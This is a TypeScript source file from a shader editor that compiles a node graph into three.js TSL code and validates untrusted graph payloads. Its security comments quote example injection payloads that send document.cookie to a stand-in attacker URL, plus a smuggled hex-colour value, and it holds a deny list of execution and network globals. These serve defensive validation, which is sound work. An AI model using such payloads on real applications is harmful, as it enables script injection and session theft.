import { parseExpression } from '@babel/parser';
import type { Node } from '@babel/types';
import type { AppNode, AppEdge, NodeDefinition, GeneratedCode } from '@/types';
import { getNodeValues } from '@/types';
import { NODE_REGISTRY, effectiveInputs } from '@/registry/nodeRegistry';
import { unwrapCollapsedGroupEdges } from '@/utils/edgeUtils';
import { sanitizeIdentifier } from '@/utils/nameUtils';
import { decodeDataNode } from '@/utils/dataNode';
import { decodeImageNode } from '@/utils/imageNode';
import { minMax, normalize01, capToWidth, buildPhaseRamp, MAX_TEXTURE_WIDTH } from '@/utils/dataViz';
import { float32ToBase64, float16ToBase64, bytesToBase64 } from '@/utils/binaryCodec';
import { hexToRgb01 } from '@/utils/colorUtils';
import { getComponentCount } from './cpuEvaluator';
import { topologicalSort } from './topologicalSort';

/** Format a JS number as a TSL-safe numeric literal (finite or `0`). */
function num(n: number): string {
  return Number.isFinite(n) ? String(n) : '0';
}

/** Inline expression that rebuilds a Float32Array from base64 at module load. */
function f32Decode(b64: string): string {
  return `new Float32Array(Uint8Array.from(atob("${b64}"), (c) => c.charCodeAt(0)).buffer)`;
}

/** Inline expression that rebuilds a Uint16Array (half-float) from base64. */
function f16Decode(b64: string): string {
  return `new Uint16Array(Uint8Array.from(atob("${b64}"), (c) => c.charCodeAt(0)).buffer)`;
}

/**
 * Bounded memo for the multi-MB image decode+re-encode. graph→code re-runs on
 * every node-identity change — including every drag frame — but an image's
 * emitted `data:` src never changes with node position, so without this the
 * whole payload is base64-decoded and re-encoded per frame. Keyed by the
 * immutable stored `imageB64`; value is the canonical `data:` src or null
 * (undecodable). Small LRU cap keeps memory bounded across many distinct images.
 */
const IMAGE_SRC_CACHE_LIMIT = 24;
const imageSrcCache = new Map<string, string | null>();
function memoImageSrc(key: string, compute: () => string | null): string | null {
  const hit = imageSrcCache.get(key);
  if (hit !== undefined) {
    imageSrcCache.delete(key);
    imageSrcCache.set(key, hit); // refresh LRU recency
    return hit;
  }
  const val = compute();
  imageSrcCache.set(key, val);
  if (imageSrcCache.size > IMAGE_SRC_CACHE_LIMIT) {
    const oldest = imageSrcCache.keys().next().value;
    if (oldest !== undefined) imageSrcCache.delete(oldest);
  }
  return val;
}

/**
 * Trace a Stripes/Data-Viz `signal` edge back to its upstream Data column,
 * capped to the texture budget and normalized to [0, 1]. Returns null when the
 * signal isn't a Data column or the column is too short to ramp. Shared by both
 * visualization branches so the WebGPU-filterability recipe lives in one place.
 */
function traceSignalColumn(
  signalEdge: AppEdge | undefined,
  sorted: AppNode[],
): { capped: Float32Array; cnorm: Float32Array } | null {
  if (!signalEdge) return null;
  const src = sorted.find((n) => n.id === signalEdge.source);
  const m = /^col(\d+)$/.exec(signalEdge.sourceHandle ?? '');
  if (!src || src.data.registryType !== 'dataNode' || !m) return null;
  const col = decodeDataNode(getNodeValues(src))?.columns[Number(m[1])];
  if (!col || col.length <= 1) return null;
  const capped = capToWidth(col, MAX_TEXTURE_WIDTH);
  return { capped, cnorm: normalize01(capped, minMax(capped)) };
}

/** Emit the setup lines for a filterable 1-D HalfFloat value texture (RedFormat
 *  + LinearFilter — the only float format WebGPU filters without a feature
 *  flag). Shared by the Stripes and Data-Viz bakes. */
function bakeHalfFloatTexture(setupLines: string[], name: string, data: Float32Array): void {
  setupLines.push(
    `const ${name} = new globalThis.THREE.DataTexture(${f16Decode(float16ToBase64(data))}, ${data.length}, 1, globalThis.THREE.RedFormat, globalThis.THREE.HalfFloatType);`,
  );
  setupLines.push(`${name}.minFilter = globalThis.THREE.LinearFilter;`);
  setupLines.push(`${name}.magFilter = globalThis.THREE.LinearFilter;`);
  setupLines.push(`${name}.needsUpdate = true;`);
}

/** Sampling coordinate in [0, 1]: uv.x (linear) or normalized radius from a
 *  chosen center (radial/concentric). Shared by Stripes and Data Viz. */
function radialCoordExpr(radial: boolean, cx: number, cy: number, radius: number): string {
  return radial
    ? `uv().sub(vec2(${num(cx)}, ${num(cy)})).length().div(${num(radius)}).clamp(0.0, 1.0)`
    : 'uv().x';
}

/** Valid swizzle component handles for split node output. */
export const VALID_SWIZZLE = new Set(['x', 'y', 'z', 'w']);

/**
 * `#rrggbb` → the `0xrrggbb` literal the colour constructors take.
 *
 * Stored hex values arrive from `.fastshader` files and pasted source, i.e.
 * ADVERSARIAL input: this used to be a bare `0x${val.slice(1)}`, so a hex of
 * `#ff0000); somethingElse(` was spliced verbatim into the generated module.
 * Anything that isn't a literal 6-digit hex degrades to black.
 */
export function hexLiteral(value: unknown): string {
  const s = String(value ?? '');
  return /^#[0-9a-fA-F]{6}$/.test(s) ? `0x${s.slice(1)}` : '0x000000';
}

/**
 * Identifiers that must never appear anywhere in an `unknown`-node expression.
 * These are the gateways to code execution / exfiltration / navigation. Used
 * both as callee names and as referenced/member identifiers, so a payload
 * can't reach them via `window.eval`, `globalThis.fetch`, bracket access, etc.
 */
const FORBIDDEN_GLOBALS = new Set([
  'eval', 'Function', 'fetch', 'import', 'require', 'globalThis',
  'window', 'document', 'self', 'top', 'parent', 'frames', 'navigator',
  'location', 'localStorage', 'sessionStorage', 'indexedDB', 'postMessage',
  'XMLHttpRequest', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker',
  'setTimeout', 'setInterval', 'queueMicrotask', 'constructor', '__proto__',
  'prototype', 'alert', 'open',
]);

/**
 * Recursively decide whether an expression AST node is a *pure data/TSL
 * expression* — literals, identifiers, swizzles, arithmetic, and calls to
 * (non-forbidden) functions whose arguments are themselves safe. Anything that
 * can execute attacker code — arrow functions / function expressions (IIFEs),
 * assignments, sequence/comma operators, computed (bracket) member access,
 * `new`, template literals, spreads, await/yield — falls through to the
 * `default` case and is rejected.
 */
function isSafeExprNode(node: Node | null | undefined): boolean {
  if (!node) return false;
  switch (node.type) {
    case 'NumericLiteral':
    case 'StringLiteral':
    case 'BooleanLiteral':
    case 'NullLiteral':
    case 'BigIntLiteral':
    case 'DecimalLiteral':
      return true;
    case 'Identifier':
      return !FORBIDDEN_GLOBALS.has(node.name);
    case 'UnaryExpression':
      // Allow the numeric/logical unaries that show up in real expressions
      // (e.g. `-1.0`, `!flag`); reject `delete`/`typeof`/`void`.
      return (node.operator === '-' || node.operator === '+' || node.operator === '!') &&
        isSafeExprNode(node.argument);
    case 'BinaryExpression':
      return ['+', '-', '*', '/', '%', '**'].includes(node.operator) &&
        node.left.type !== 'PrivateName' &&
        isSafeExprNode(node.left) && isSafeExprNode(node.right);
    case 'ArrayExpression':
      // A `null` element is an array hole; a SpreadElement falls through to
      // isSafeExprNode's default and is rejected.
      return node.elements.every((el) => el == null || isSafeExprNode(el));
    case 'MemberExpression':
      // Only `obj.prop` (static, non-forbidden property) — never `obj[expr]`.
      return !node.computed &&
        node.property.type === 'Identifier' &&
        !FORBIDDEN_GLOBALS.has(node.property.name) &&
        isSafeExprNode(node.object);
    case 'CallExpression': {
      const callee = node.callee;
      if (callee.type === 'Identifier') {
        if (FORBIDDEN_GLOBALS.has(callee.name)) return false;
      } else if (callee.type === 'MemberExpression') {
        // Method-chain callee, e.g. `vec3(...).mul(2)` — validate the chain.
        if (!isSafeExprNode(callee)) return false;
      } else {
        // Super(), import(), an IIFE callee, a tagged template, etc.
        return false;
      }
      return node.arguments.every((a) => isSafeExprNode(a));
    }
    default:
      return false;
  }
}

/**
 * The `unknown`-node round-trip stores the original call-expression substring
 * in `rawExpression`. graphToCode re-emits it verbatim into the generated
 * module, so a hand-edited `.fastshader` file (or anything else that can write
 * the graph payload) could swap that string for something like
 * `foo((()=>{ window.location='http://attacker/'+document.cookie })())` or
 * `foo(fetch('http://attacker'))` and inject arbitrary JS into the executing
 * shader module.
 *
 * codeToGraph's parser only ever stores the slice of a single CallExpression
 * with a bare-identifier callee. We re-parse on emit and require:
 *   1. parses cleanly as a JS expression (not a statement list)
 *   2. is a CallExpression
 *   3. the callee is a plain Identifier (no `something.eval(...)` /
 *      `(()=>{...})()` / bracket-property access at the top level)
 *   4. EVERY node in the subtree — including the arguments — is a pure
 *      data/TSL expression (isSafeExprNode), so the arguments can't smuggle
 *      `fetch`, an arrow-function IIFE, an assignment, etc.
 *
 * Sandboxing the preview iframe means even a successful injection lands in
 * an opaque-origin frame with no localStorage access, but defense in depth
 * is cheap here: keep the inert fallback (`float(0)`) so the shader still
 * compiles and the editor shows the magenta unknown-node tile, instead of
 * mid-flight surprising the user with attacker JS.
 */
function isSafeUnknownExpression(expr: string): boolean {
  try {
    const ast = parseExpression(expr, { sourceType: 'module', plugins: ['typescript'] });
    if (ast.type !== 'CallExpression') return false;
    if (ast.callee.type !== 'Identifier') return false;
    // Deep-validate the whole call (callee name + every argument subtree).
    return isSafeExprNode(ast);
  } catch {
    return false;
  }
}

export function graphToCode(
  nodes: AppNode[],
  edges: AppEdge[],
  registry: Map<string, NodeDefinition> = NODE_REGISTRY
): GeneratedCode {
  if (nodes.length === 0) {
    return { code: '// Empty shader — add nodes to begin\n', importStatements: [], varNames: new Map() };
  }

  // Collapsed groups have rewritten boundary edges to point at synthetic group
  // sockets — translate them back to their original child endpoints so this
  // function compiles against the logical graph rather than the visual one.
  edges = unwrapCollapsedGroupEdges(nodes, edges);

  const sorted = topologicalSort(nodes, edges);

  // Assign unique variable names
  const varNames = new Map<string, string>();
  const usedNames = new Set<string>();

  /**
   * Claim the first free variable name for `base`: `base1`, `base2`, … —
   * or, with `bareFirst`, the bare `base` before falling back to `base2`,
   * `base3`, …. `extraFree` AND-composes with the built-in usedNames check;
   * `aliases` lists companion identifiers a candidate would also emit (e.g. a
   * data node's `<name>_colN` columns) — a candidate is only claimable when
   * every alias passes the same composed check, and claiming reserves the name
   * AND all its aliases.
   */
  const claimName = (
    base: string,
    opts: {
      bareFirst?: boolean;
      extraFree?: (candidate: string) => boolean;
      aliases?: (name: string) => string[];
    } = {}
  ): string => {
    const free = (c: string) => !usedNames.has(c) && (opts.extraFree?.(c) ?? true);
    const claimable = (c: string) => free(c) && (opts.aliases?.(c) ?? []).every(free);
    let idx = 1;
    let name = opts.bareFirst ? base : `${base}${idx}`;
    while (!claimable(name)) name = `${base}${++idx}`;
    usedNames.add(name);
    for (const alias of opts.aliases?.(name) ?? []) usedNames.add(alias);
    return name;
  };

  // Property nodes claim their user-defined names FIRST, before any other node
  // gets a variable. A property's name is its public API — the schema key, the
  // <a-entity> attribute, the setAttribute() key — while every other var name
  // is private to the module body. Claiming in plain topological order let an
  // ordinary node steal a property's name (a Color swatch emitted first claims
  // `color1`, bumping a property NAMED color1 to `color12`), and the exported
  // schema/usage header then documented a key the body never read.
  for (const node of sorted) {
    if (node.data.registryType !== 'property_float' && node.data.registryType !== 'property_color') continue;
    const nodeValues = getNodeValues(node);
    const rawName = String(nodeValues.name ?? 'property1');
    varNames.set(node.id, claimName(sanitizeIdentifier(rawName), { bareFirst: true }));
  }

  for (const node of sorted) {
    const def = registry.get(node.data.registryType);
    if (!def || node.data.registryType === 'output' || node.data.registryType === 'split') continue;

    // Property nodes: already claimed in the pre-pass above.
    if (node.data.registryType === 'property_float' || node.data.registryType === 'property_color') {
      continue;
    }

    // Unknown nodes: use the stored function name as the variable base
    if (def.type === 'unknown') {
      const nv = getNodeValues(node);
      let baseName = String(nv.functionName ?? 'unknown').replace(/[^a-zA-Z0-9_$]/g, '_');
      if (!baseName) baseName = 'unknown';
      varNames.set(node.id, claimName(baseName));
      continue;
    }

    // Data nodes emit one variable PLUS a `<var>_colN` per consumed column, and
    // those column identifiers share the Fn-body namespace with property/unknown
    // names. Claim the column handles this node will emit (the ones an edge
    // references) as aliases so the base only lands where its whole column
    // namespace is free — otherwise a property renamed `data1_col1` collides
    // with the emitted `const data1_col1` → duplicate declaration → SyntaxError.
    if (def.type === 'dataNode') {
      const refCols = new Set<string>();
      for (const e of edges) {
        if (e.source !== node.id) continue;
        if (/^col\d+$/.test(e.sourceHandle ?? '')) refCols.add(e.sourceHandle as string);
      }
      varNames.set(node.id, claimName('data', {
        aliases: (name) => [...refCols].map((h) => `${name}_${h}`),
      }));
      continue;
    }

    // Stripes / Data Viz / Image nodes have no tslFunction (custom emission),
    // so give them explicit bases instead of the empty-string fallback below.
    if (def.type === 'stripes' || def.type === 'dataviz' || def.type === 'imageNode') {
      const baseName =
        def.type === 'stripes' ? 'stripes'
          : def.type === 'dataviz' ? 'dataviz'
            : 'image';
      varNames.set(node.id, claimName(baseName));
      continue;
    }

    let baseName = def.tslFunction;
    // Clean up names for MaterialX functions
    if (baseName.startsWith('mx_')) {
      baseName = baseName.replace('mx_', '').replace(/_float$|_vec[234]$/, '');
    }

    // Always number from 1 to avoid shadowing TSL imports (color1, add1, etc.)
    varNames.set(node.id, claimName(baseName));
  }

  // Collect imports grouped by module
  const importsByModule = new Map<string, Set<string>>();

  const addImport = (module: string, name: string) => {
    if (!module) return;
    if (!importsByModule.has(module)) {
      importsByModule.set(module, new Set());
    }
    importsByModule.get(module)!.add(name);
  };

  // Always need Fn
  addImport('three/tsl', 'Fn');

  for (const node of sorted) {
    const def = registry.get(node.data.registryType);
    if (!def || node.data.registryType === 'output' || !def.tslImportModule) continue;
    // UV import is handled in body generation (with channel parameter)
    if (def.type === 'uv') continue;
    // hsl/toHsl are local helpers, not TSL exports — never try to import them.
    if (def.type === 'hsl' || def.type === 'toHsl') continue;
    addImport(def.tslImportModule, def.tslFunction);
  }

  // Collect helper imports for hsl/toHsl if used
  const usedHsl = sorted.some((n) => n.data.registryType === 'hsl');
  const usedToHsl = sorted.some((n) => n.data.registryType === 'toHsl');
  if (usedHsl) {
    for (const name of ['mul', 'add', 'sub', 'abs', 'mod', 'clamp', 'float', 'vec3']) {
      addImport('three/tsl', name);
    }
  }
  if (usedToHsl) {
    for (const name of ['max', 'min', 'sub', 'add', 'mul', 'abs', 'select', 'greaterThan', 'lessThan', 'equal', 'div', 'float', 'vec3']) {
      addImport('three/tsl', name);
    }
  }

  // Build body lines
  const bodyLines: string[] = [];
  // Module-scope setup emitted BEFORE the shader Fn — the Data/Stripes nodes
  // build their `THREE.DataTexture` lookups here (closed over by the Fn body).
  const setupLines: string[] = [];

  for (const node of sorted) {
    const def = registry.get(node.data.registryType);
    if (!def || node.data.registryType === 'output' || node.data.registryType === 'split') continue;

    const varName = varNames.get(node.id)!;

    // Unknown nodes: emit the preserved raw expression verbatim, but only
    // after verifying it still looks like the simple `funcName(args)` shape
    // codeToGraph produces. See isSafeUnknownExpression for the threat
    // model — adversarial graph payloads otherwise get to inject arbitrary
    // statements into the generated module.
    if (def.type === 'unknown') {
      const nv = getNodeValues(node);
      const rawExpr = String(nv.rawExpression ?? 'float(0)');
      const safeExpr = isSafeUnknownExpression(rawExpr) ? rawExpr : 'float(0)';
      bodyLines.push(`  const ${varName} = ${safeExpr};`);
      continue;
    }

    const args = resolveArguments(node, edges, varNames, def, sorted);

    if (def.type === 'uv') {
      // UV node: channel selector + tiling + rotation
      const nv = getNodeValues(node);
      addImport('three/tsl', 'uv');

      // Resolve channel (UV map index)
      const channelExpr = resolveExposedParam(node, 'channel', edges, varNames, nv, sorted);
      const baseExpr = channelExpr === '0' ? 'uv()' : `uv(${channelExpr})`;

      // Resolve tiling and rotation (may be connected via input ports)
      const tilingU = resolveExposedParam(node, 'tilingU', edges, varNames, nv, sorted);
      const tilingV = resolveExposedParam(node, 'tilingV', edges, varNames, nv, sorted);
      const rotationExpr = resolveExposedParam(node, 'rotation', edges, varNames, nv, sorted);
      const hasTiling = tilingU !== '1' || tilingV !== '1';
      const hasRotation = rotationExpr !== '0';

      if (!hasTiling && !hasRotation) {
        bodyLines.push(`  const ${varName} = ${baseExpr};`);
      } else if (hasTiling && !hasRotation) {
        addImport('three/tsl', 'mul');
        addImport('three/tsl', 'vec2');
        bodyLines.push(`  const ${varName} = mul(${baseExpr}, vec2(${tilingU}, ${tilingV}));`);
      } else {
        // Rotation (with optional tiling)
        addImport('three/tsl', 'vec2');
        addImport('three/tsl', 'sub');
        addImport('three/tsl', 'add');
        addImport('three/tsl', 'mul');
        addImport('three/tsl', 'cos');
        addImport('three/tsl', 'sin');
        const scaledExpr = hasTiling ? `mul(${baseExpr}, vec2(${tilingU}, ${tilingV}))` : baseExpr;
        const cVar = `_${varName}`;
        bodyLines.push(`  const ${cVar} = sub(${scaledExpr}, vec2(0.5, 0.5));`);
        bodyLines.push(`  const ${varName} = add(vec2(sub(mul(${cVar}.x, cos(${rotationExpr})), mul(${cVar}.y, sin(${rotationExpr}))), add(mul(${cVar}.x, sin(${rotationExpr})), mul(${cVar}.y, cos(${rotationExpr})))), vec2(0.5, 0.5));`);
      }
    } else if (def.type === 'dataNode') {
      // Data node: one float DataTexture per *consumed* column (FloatType +
      // Nearest = exact values, valid in WebGPU without the float32-filterable
      // feature). Each column output samples its texture at uv.x. The node
      // itself produces no value — resolveEdgeRef maps `colN` handles to the
      // per-column vars emitted here.
      const nv = getNodeValues(node);
      const decoded = decodeDataNode(nv);
      const usedCols = new Set<number>();
      for (const e of edges) {
        if (e.source !== node.id) continue;
        const m = /^col(\d+)$/.exec(e.sourceHandle ?? '');
        if (m) usedCols.add(Number(m[1]));
      }
      if (usedCols.size > 0) {
        // Every referenced column MUST get a declaration: resolveEdgeRef hands
        // consumers `<var>_colN` unconditionally, so a missing one is a runtime
        // ReferenceError that kills the whole module. Columns that decode bake a
        // texture; a missing/undecodable/out-of-range column degrades to an
        // inert float(0) (mirrors the imageNode fallback), so a tampered or
        // truncated payload never crashes the shader.
        addImport('three/tsl', 'float');
        let bakedAny = false;
        for (const ci of [...usedCols].sort((a, b) => a - b)) {
          const col = decoded?.columns[ci];
          if (col && col.length > 0) {
            if (!bakedAny) {
              addImport('three/tsl', 'texture');
              addImport('three/tsl', 'uv');
              addImport('three/tsl', 'vec2');
              bakedAny = true;
            }
            const capped = capToWidth(col, MAX_TEXTURE_WIDTH);
            const texVar = `_${varName}_tex${ci}`;
            setupLines.push(
              `const ${texVar} = new globalThis.THREE.DataTexture(${f32Decode(float32ToBase64(capped))}, ${capped.length}, 1, globalThis.THREE.RedFormat, globalThis.THREE.FloatType);`,
            );
            setupLines.push(`${texVar}.needsUpdate = true;`);
            bodyLines.push(`  const ${varName}_col${ci} = texture(${texVar}, vec2(uv().x, 0.5)).x;`);
          } else {
            bodyLines.push(`  const ${varName}_col${ci} = float(0.0);`);
          }
        }
      }
    } else if (def.type === 'imageNode') {
      // Image node: the dropped image rides inside the module as a compressed
      // data: URL, decoded at module scope with top-level await (the
      // shaderloader `await import()`s the blob module, so the texture is
      // ready before first render; a garbage payload fails decode() and falls
      // back to a 1×1 black texture instead of rejecting the whole module).
      //
      // SECURITY: the stored payload is NEVER interpolated verbatim — the
      // graph JSON is adversarial. decodeImageNode strict-validates it and
      // the emitted literal is re-encoded from the decoded bytes
      // (bytesToBase64 → canonical btoa alphabet) with the MIME taken from
      // the regex whitelist capture, so no attacker-controlled character can
      // reach this module's source text. Emitted as FLAT statements (never an
      // async IIFE — codeToGraph's ReturnStatement visitor would mistake its
      // `return` for the shader output).
      const nv = getNodeValues(node);
      // Decode + re-encode is the multi-MB cost; memoize it so a drag frame
      // (which re-runs graph→code) doesn't re-encode an unchanged image. The key
      // covers every input decodeImageNode validates — the payload plus the
      // width/height fields (a bad dimension must still degrade to inert).
      // srcAttr is the canonical `data:` URL, or null if validation failed.
      const srcAttr = memoImageSrc(
        `${Number(nv.width)}x${Number(nv.height)}|${String(nv.imageB64 ?? '')}`,
        () => {
          const d = decodeImageNode(nv);
          return d ? `data:image/${d.mime};base64,${bytesToBase64(d.bytes)}` : null;
        },
      );
      if (!srcAttr) {
        // Inert fallback — consumers still reference this var, so it must
        // exist (a missing declaration would be a runtime ReferenceError).
        addImport('three/tsl', 'vec3');
        bodyLines.push(`  const ${varName} = vec3(0, 0, 0);`);
      } else {
        addImport('three/tsl', 'texture');
        const uvEdge = edges.find((e) => e.target === node.id && e.targetHandle === 'uv');
        const uvRef = uvEdge ? resolveEdgeRef(uvEdge, edges, varNames, sorted) : null;
        if (!uvRef) addImport('three/tsl', 'uv');
        // UV-space transform settings (NodeSettingsMenu). All Number-coerced —
        // never interpolate stored strings. The raw sample renders mirrored
        // left-right in the preview pipeline, so the CORRECTED orientation
        // (u' = 1-u) is the baked-in default; the user-facing "Flip X" toggle
        // (default off/unchecked) mirrors RELATIVE to that corrected look —
        // checking it cancels the correction and yields the raw sample. Each
        // flip is `1-c`, emitted as mul/add so it composes with a connected
        // uv source.
        const numVal = (key: string, dflt: number) => {
          const v = Number(nv[key]);
          return Number.isFinite(v) ? v : dflt;
        };
        // Tile/offset can be exposed as sockets — a wired edge overrides the
        // stored value (same contract as the uv node's params). Refs are
        // generated identifiers, literals go through num(): nothing
        // attacker-controlled reaches the emitted text.
        const paramExpr = (key: string, dflt: number): string => {
          const pEdge = edges.find((e) => e.target === node.id && e.targetHandle === key);
          if (pEdge) {
            const ref = resolveEdgeRef(pEdge, edges, varNames, sorted);
            if (ref) return ref;
          }
          return num(numVal(key, dflt));
        };
        const mirrorX = numVal('flipX', 0) < 0.5;
        const mirrorY = numVal('flipY', 0) >= 0.5;
        const tileX = paramExpr('tileX', 1);
        const tileY = paramExpr('tileY', 1);
        const offsetX = paramExpr('offsetX', 0);
        const offsetY = paramExpr('offsetY', 0);
        const repeat = numVal('repeat', 1) >= 0.5;
        let uvExpr = uvRef ?? 'uv()';
        if (mirrorX || mirrorY) {
          uvExpr = `${uvExpr}.mul(vec2(${mirrorX ? -1 : 1}, ${mirrorY ? -1 : 1})).add(vec2(${mirrorX ? 1 : 0}, ${mirrorY ? 1 : 0}))`;
        }
        if (tileX !== '1' || tileY !== '1') uvExpr = `${uvExpr}.mul(vec2(${tileX}, ${tileY}))`;
        if (offsetX !== '0' || offsetY !== '0') uvExpr = `${uvExpr}.add(vec2(${offsetX}, ${offsetY}))`;
        if (uvExpr !== (uvRef ?? 'uv()')) addImport('three/tsl', 'vec2');
        const isData = String(nv.colorSpace ?? 'color') === 'data';
        const imgVar = `_${varName}_img`;
        const okVar = `_${varName}_ok`;
        const texVar = `_${varName}_tex`;
        setupLines.push(`const ${imgVar} = new Image();`);
        setupLines.push(`${imgVar}.src = "${srcAttr}";`);
        setupLines.push(`let ${okVar} = true;`);
        setupLines.push(`try { await ${imgVar}.decode(); } catch { ${okVar} = false; }`);
        setupLines.push(
          `const ${texVar} = ${okVar} ? new globalThis.THREE.Texture(${imgVar}) : new globalThis.THREE.DataTexture(new Uint8Array([0, 0, 0, 255]), 1, 1, globalThis.THREE.RGBAFormat, globalThis.THREE.UnsignedByteType);`,
        );
        setupLines.push(`${texVar}.colorSpace = globalThis.THREE.${isData ? 'NoColorSpace' : 'SRGBColorSpace'};`);
        if (isData) {
          // Data maps (normal/height): linear values, no mip pre-filtering.
          setupLines.push(`${texVar}.generateMipmaps = false;`);
          setupLines.push(`${texVar}.minFilter = globalThis.THREE.LinearFilter;`);
          setupLines.push(`${texVar}.magFilter = globalThis.THREE.LinearFilter;`);
        }
        // Repeat (default) so tiling — via the settings above or the uv node's
        // tilingU/tilingV — wraps instead of smearing the edge pixels; the
        // settings menu can switch to clamp. flipY pinned explicitly so
        // orientation never rides on a three.js default.
        const wrapMode = repeat ? 'RepeatWrapping' : 'ClampToEdgeWrapping';
        setupLines.push(`${texVar}.wrapS = globalThis.THREE.${wrapMode};`);
        setupLines.push(`${texVar}.wrapT = globalThis.THREE.${wrapMode};`);
        setupLines.push(`${texVar}.flipY = true;`);
        setupLines.push(`${texVar}.needsUpdate = true;`);
        bodyLines.push(`  const ${varName} = texture(${texVar}, ${uvExpr}).rgb;`);
      }
    } else if (def.type === 'stripes') {
      // Data Stripes: density-modulated bars + sequential color ramp. Stripe
      // density comes from a CPU-precomputed cumulative-phase ramp (prefix-sum
      // of the desired local frequency) baked from the upstream Data column —
      // so the bars stay continuous (no tearing). Derivative AA + moiré
      // fade-to-average defeat shimmering when the period drops below a pixel.
      const nv = getNodeValues(node);
      const bf = Number(nv.baseFrequency ?? 80);
      const dens = Number(nv.density ?? 1.5);
      const lo = hexToRgb01(String(nv.lowColor ?? '#1b2a4a'));
      const hi = hexToRgb01(String(nv.highColor ?? '#ffd24d'));
      // Radial ("target"/tree-ring) mode: index the data by distance from a
      // choosable center instead of uv.x, so the bands become concentric rings.
      const radial = Number(nv.radial ?? 0) >= 0.5;
      const cx = Number(nv.center_x ?? 0.5);
      const cy = Number(nv.center_y ?? 0.5);
      const radius = Math.max(Number(nv.radius ?? 0.5), 1e-4);
      // How strongly the stripes darken the value-color. 0 = a clean value
      // heatmap (no stripes, colour alone shows the data); ~0.75 = bold stripes.
      const lineStrength = Math.min(Math.max(Number(nv.lineStrength ?? 0.75), 0), 1);
      addImport('three/tsl', 'float');
      addImport('three/tsl', 'vec3');
      addImport('three/tsl', 'uv');
      addImport('three/tsl', 'dFdx');
      addImport('three/tsl', 'dFdy');
      if (radial) addImport('three/tsl', 'vec2');

      const signalEdge = edges.find((e) => e.target === node.id && e.targetHandle === 'signal');
      const signalRef = signalEdge ? resolveEdgeRef(signalEdge, edges, varNames, sorted) : null;

      // Trace the signal to a Data column → bake a cumulative-phase ramp (stripe
      // density) AND a normalized-value ramp (color). Both are sampled at the
      // SAME coordinate, so linear and radial modes stay in sync.
      let phaseTexVar: string | null = null;
      let valueTexVar: string | null = null;
      let totalCycles = bf;
      const traced = traceSignalColumn(signalEdge, sorted);
      if (traced) {
        const ramp = buildPhaseRamp(traced.cnorm, bf, dens);
        totalCycles = ramp.totalCycles;
        addImport('three/tsl', 'texture');
        addImport('three/tsl', 'vec2');
        phaseTexVar = `_${varName}_phase`;
        valueTexVar = `_${varName}_value`;
        bakeHalfFloatTexture(setupLines, phaseTexVar, ramp.phase01);
        bakeHalfFloatTexture(setupLines, valueTexVar, traced.cnorm);
      }

      const coord = `_${varName}_coord`;
      const p = `_${varName}_p`;
      const tri = `_${varName}_tri`;
      const fw = `_${varName}_fw`;
      const ln = `_${varName}_ln`;
      const lnS = `_${varName}_lnS`;
      const br = `_${varName}_br`;
      const t = `_${varName}_t`;
      const col = `_${varName}_col`;

      // Sampling coordinate in [0,1]: horizontal position (linear), or the
      // normalized radius from the chosen center (concentric rings) when radial.
      bodyLines.push(`  const ${coord} = ${radialCoordExpr(radial, cx, cy, radius)};`);

      const phaseExpr = phaseTexVar
        ? `texture(${phaseTexVar}, vec2(${coord}, 0.5)).x.mul(${num(totalCycles)})`
        : `${coord}.mul(${num(bf)})`;
      const colorT = valueTexVar
        ? `texture(${valueTexVar}, vec2(${coord}, 0.5)).x`
        : signalRef
          ? `${signalRef}.clamp(0.0, 1.0)`
          : coord;

      // Continuous phase (NEVER take the derivative of fract(phase)).
      bodyLines.push(`  const ${p} = ${phaseExpr};`);
      bodyLines.push(`  const ${tri} = ${p}.fract().mul(2.0).sub(1.0).abs();`);
      bodyLines.push(`  const ${fw} = dFdx(${p}).abs().add(dFdy(${p}).abs());`);
      bodyLines.push(`  const ${ln} = ${tri}.smoothstep(float(0.5).sub(${fw}), float(0.5).add(${fw}));`);
      // Fade dense (sub-pixel) regions to the average band so they don't shimmer.
      bodyLines.push(`  const ${lnS} = ${ln}.mix(float(0.5), ${fw}.mul(2.0).sub(1.0).clamp(0.0, 1.0));`);
      bodyLines.push(`  const ${br} = float(1.0).sub(${lnS}.mul(${num(lineStrength)}));`);
      bodyLines.push(`  const ${t} = ${colorT};`);
      bodyLines.push(
        `  const ${col} = vec3(${num(lo[0])}, ${num(lo[1])}, ${num(lo[2])}).mix(vec3(${num(hi[0])}, ${num(hi[1])}, ${num(hi[2])}), ${t});`,
      );
      bodyLines.push(`  const ${varName} = ${col}.mul(${br});`);
    } else if (def.type === 'dataviz') {
      // Data Viz: a single Data column distributed along one axis (or radially)
      // as a continuous colour ramp with a full tone curve. Unlike Stripes there
      // are no bars — colour alone reads the value. The upstream column is baked
      // into a normalized HalfFloat value texture (filterable) and sampled at the
      // coord; the tone curve is applied as a chain of TSL ops before the mix.
      const nv = getNodeValues(node);
      const scale = Number(nv.scale ?? 1);
      const offset = Number(nv.offset ?? 0);
      const contrast = Number(nv.contrast ?? 1);
      const lowCut = Number(nv.lowCutoff ?? 0);
      const highCut = Number(nv.highCutoff ?? 1);
      // Midpoint drives a gamma so the chosen input value maps to output 0.5
      // (lower midpoint → brighter midtones). Kept strictly inside (0,1) so the
      // log is finite.
      const midpoint = Math.min(Math.max(Number(nv.midpoint ?? 0.5), 1e-3), 1 - 1e-3);
      const lo = hexToRgb01(String(nv.lowColor ?? '#1b2a4a'));
      const hi = hexToRgb01(String(nv.highColor ?? '#ffd24d'));
      const radial = Number(nv.radial ?? 0) >= 0.5;
      const cx = Number(nv.center_x ?? 0.5);
      const cy = Number(nv.center_y ?? 0.5);
      const radius = Math.max(Number(nv.radius ?? 0.5), 1e-4);
      addImport('three/tsl', 'vec3');
      addImport('three/tsl', 'uv');
      if (radial) addImport('three/tsl', 'vec2');

      // Trace the signal to a Data column → bake a normalized-value ramp (color).
      const signalEdge = edges.find((e) => e.target === node.id && e.targetHandle === 'signal');
      const signalRef = signalEdge ? resolveEdgeRef(signalEdge, edges, varNames, sorted) : null;
      let valueTexVar: string | null = null;
      const traced = traceSignalColumn(signalEdge, sorted);
      if (traced) {
        addImport('three/tsl', 'texture');
        addImport('three/tsl', 'vec2');
        valueTexVar = `_${varName}_value`;
        bakeHalfFloatTexture(setupLines, valueTexVar, traced.cnorm);
      }

      const coord = `_${varName}_coord`;
      bodyLines.push(`  const ${coord} = ${radialCoordExpr(radial, cx, cy, radius)};`);

      // Raw normalized value in [0,1] at this coord.
      const rawExpr = valueTexVar
        ? `texture(${valueTexVar}, vec2(${coord}, 0.5)).x`
        : signalRef
          ? `${signalRef}.clamp(0.0, 1.0)`
          : `${coord}`;

